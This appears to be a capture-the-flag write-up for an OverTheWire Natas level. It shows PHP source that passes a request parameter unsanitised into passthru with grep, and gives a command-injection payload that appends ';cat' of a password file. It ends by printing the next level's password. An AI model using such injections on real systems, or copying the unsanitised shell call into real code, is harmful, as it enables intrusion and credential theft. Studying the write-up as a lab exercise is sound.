# Solution
## Enumeration
```php
<?  
$key = "";  
  
if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];  
}  
  
if($key != "") {    passthru("grep -i $key dictionary.txt");  
}  
?>
```

This clearly shows us a command injection vulnerability
Test Payload:
```bash
;cat /etc/natas_webpass/natas9;
```
To get the level 10 password, simply change the file name to natas10:
```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```